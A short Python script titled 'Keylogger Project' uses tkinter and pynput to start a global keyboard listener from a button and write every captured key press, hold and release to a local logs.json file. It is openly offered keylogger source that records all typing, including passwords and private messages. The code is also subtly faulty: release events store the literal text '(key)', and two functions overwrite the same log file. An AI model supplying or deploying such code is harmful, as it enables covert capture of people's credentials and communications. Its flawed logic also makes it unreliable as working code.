import tkinter as tk

from tkinter import *

from pynput import keyboard

import json

 

root = tk.Tk()

root.geometry("250x300")

root.title("Keylogger Project")

 

key_list = []

x = False

key_strokes=""

 

def update_txt_file(key):

    with open('logs.json' , '+w') as key_strokes:

        key_strokes.write(key)

 

def update_json_file (key_list):

    with open('logs.json' , '+wb') as key_log:

        key_list_bytes = json.dumps(key_list).encode()

        key_log.write(key_list_bytes)

   

 

 

def on_press(key) :

    global x, key_list

    if x == False:

        key_list.append(

            {'Pressed': f'{key}'}

        )

        x = True

        if x == True:

            key_list.append(

                {'Held': f'{key}'}

            )

    update_json_file(key_list)

               

 

def on_release (key):

    global x, key_list,key_strokes

    key_list.append(

        {'Released': '(key)'}

    )

 

    if x == True:

        x = False

        update_json_file(key_list)

 

        key_strokes=key_strokes+str(key)

        update_txt_file(str(key_strokes))

 

def butaction():

   

    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in ’logs.json'")

   

    with keyboard.Listener(

        on_press=on_press,

        on_release=on_release) as listener:

        listener.join()

 

empty = Label(root ,text=" ").grid(row=0,column=0)

empty = Label(root ,text=" ").grid(row=1,column=0)

empty = Label(root ,text=" ").grid(row=2,column=0)

 

empty = Label(root ,text="Keylogger Project", font='verdana 11 bold').grid(row=3,column=3)

 

empty = Label(root ,text=" ").grid(row=4,column=0)

 

Button(root, text="Start Keylogger", command =butaction).grid(row=5,column=3)

root.mainloop()
